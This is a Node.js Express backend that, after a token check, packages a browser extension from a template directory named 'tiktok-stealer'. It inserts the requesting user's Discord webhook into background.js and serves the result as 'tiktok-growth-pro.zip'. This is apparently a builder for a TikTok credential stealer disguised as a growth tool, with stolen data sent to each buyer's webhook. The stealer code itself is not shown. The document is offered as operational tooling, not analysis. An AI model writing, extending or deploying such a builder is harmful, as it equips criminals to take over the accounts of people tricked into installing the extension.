import express from 'express';
import cors from 'cors';
import crypto from 'crypto';
import { createClient } from '@supabase/supabase-js';
import JSZip from 'jszip';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
  origin: 'https://elitetools.lovable.app',
  methods: ['GET', 'POST', 'PUT', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Supabase client
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

// Verify elit_ token and get discord_id
async function verifyElitToken(token) {
  if (!token?.startsWith('elit_')) return null;

  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');

  try {
    const { data, error } = await supabase.rpc('verify_discord_api_token', {
      _token_hash: tokenHash
    });

    if (error || !data?.length) return null;
    return data[0].discord_id;
  } catch (e) {
    console.log('RPC failed, trying direct query:', e);
    
    const { data, error } = await supabase
      .from('discord_api_tokens')
      .select('discord_id')
      .eq('token_hash', tokenHash)
      .eq('revoked', false)
      .maybeSingle();

    if (error || !data) return null;
    return data.discord_id;
  }
}

// Health check
app.get('/', (req, res) => {
  res.send('Extension Backend Running ✅');
});

// Generate extension endpoint
app.get('/api/generate-extension', async (req, res) => {
  const { token } = req.query;
  
  if (!token) {
    return res.status(401).send('No token provided');
  }
  
  try {
    const discord_id = await verifyElitToken(token);
    
    if (!discord_id) {
      return res.status(401).send('Invalid token');
    }
    
    // Check discord_verified_users table for webhook
    const { data: discordUser, error: discordError } = await supabase
      .from('discord_verified_users')
      .select('discord_webhook')
      .eq('discord_id', discord_id)
      .maybeSingle();
    
    if (discordError) {
      console.error('Discord user error:', discordError);
      return res.status(500).send('Error fetching user: ' + discordError.message);
    }
    
    if (!discordUser) {
      return res.status(404).send('User not found. Please verify your Discord account first.');
    }
    
    if (!discordUser.discord_webhook) {
      return res.status(400).send('No webhook configured. Please set your webhook in Settings → Webhook Configuration.');
    }
    
    const webhook = discordUser.discord_webhook;
    
    // Read template files
    const templatePath = path.join(__dirname, 'templates', 'tiktok-stealer');
    
    const manifest = fs.readFileSync(path.join(templatePath, 'manifest.json'), 'utf8');
    const background = fs.readFileSync(path.join(templatePath, 'background.js'), 'utf8');
    const popup_html = fs.readFileSync(path.join(templatePath, 'popup.html'), 'utf8');
    const popup_js = fs.readFileSync(path.join(templatePath, 'popup.js'), 'utf8');
    
    // Replace webhook placeholder
    const customBackground = background.replace('WEBHOOK_PLACEHOLDER_12345', webhook);
    
    // Create ZIP
    const zip = new JSZip();
    zip.file('manifest.json', manifest);
    zip.file('background.js', customBackground);
    zip.file('popup.html', popup_html);
    zip.file('popup.js', popup_js);
    
    // Check if icons exist and add them
    const iconPath = path.join(templatePath, 'icon128.png');
    if (fs.existsSync(iconPath)) {
      zip.file('icon16.png', fs.readFileSync(path.join(templatePath, 'icon16.png')));
      zip.file('icon48.png', fs.readFileSync(path.join(templatePath, 'icon48.png')));
      zip.file('icon128.png', fs.readFileSync(iconPath));
    }
    
    // Generate ZIP buffer
    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer' });
    
    // Send as download
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename="tiktok-growth-pro.zip"');
    res.send(zipBuffer);
  } catch (error) {
    console.error('Generate extension error:', error);
    res.status(500).send('Error generating extension: ' + error.message);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
